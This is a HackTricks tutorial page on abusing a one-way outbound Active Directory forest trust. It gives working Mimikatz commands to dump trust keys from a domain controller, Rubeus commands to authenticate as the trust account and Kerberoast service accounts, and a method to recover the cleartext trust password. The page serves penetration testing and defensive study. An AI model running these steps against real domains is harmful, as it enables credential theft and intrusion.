# External Forest Domain - One-Way (Outbound)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

In this scenario **your domain** is **trusting** some **privileges** to principal from a **different domains**.

## Enumeration

### Outbound Trust

```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```

## Trust Account Attack

A security vulnerability exists when a trust relationship is established between two domains, identified here as domain **A** and domain **B**, where domain **B** extends its trust to domain **A**. In this setup, a special account is created in domain **A** for domain **B**, which plays a crucial role in the authentication process between the two domains. This account, associated with domain **B**, is utilized for encrypting tickets for accessing services across the domains.

The critical aspect to understand here is that the password and hash of this special account can be extracted from a Domain Controller in domain **A** using a command line tool. The command to perform this action is:

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```

This extraction is possible because the account, identified with a **$** after its name, is active and belongs to the "Domain Users" group of domain **A**, thereby inheriting permissions associated with this group. This allows individuals to authenticate against domain **A** using the credentials of this account.

**Warning:** It is feasible to leverage this situation to gain a foothold in domain **A** as a user, albeit with limited permissions. However, this access is sufficient to perform enumeration on domain **A**.

In a scenario where `ext.local` is the trusting domain and `root.local` is the trusted domain, a user account named `EXT$` would be created within `root.local`. Through specific tools, it is possible to dump the Kerberos trust keys, revealing the credentials of `EXT$` in `root.local`. The command to achieve this is:

```bash
lsadump::trust /patch
```

Following this, one could use the extracted RC4 key to authenticate as `root.local\EXT$` within `root.local` using another tool command:

```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```

This authentication step opens up the possibility to enumerate and even exploit services within `root.local`, such as performing a Kerberoast attack to extract service account credentials using:

```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```

### Gathering cleartext trust password

In the previous flow it was used the trust hash instead of the **clear text password** (that was also **dumped by mimikatz**).

The cleartext password can be obtained by converting the \[ CLEAR ] output from mimikatz from hexadecimal and removing null bytes ‘\x00’:

![](<../../.gitbook/assets/image (938).png>)

Sometimes when creating a trust relationship, a password must be typed in by the user for the trust. In this demonstration, the key is the original trust password and therefore human readable. As the key cycles (30 days), the cleartext will not be human-readable but technically still usable.

The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT using the Kerberos secret key of the trust account. Here, querying root.local from ext.local for members of Domain Admins:

![](<../../.gitbook/assets/image (792).png>)

## References

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
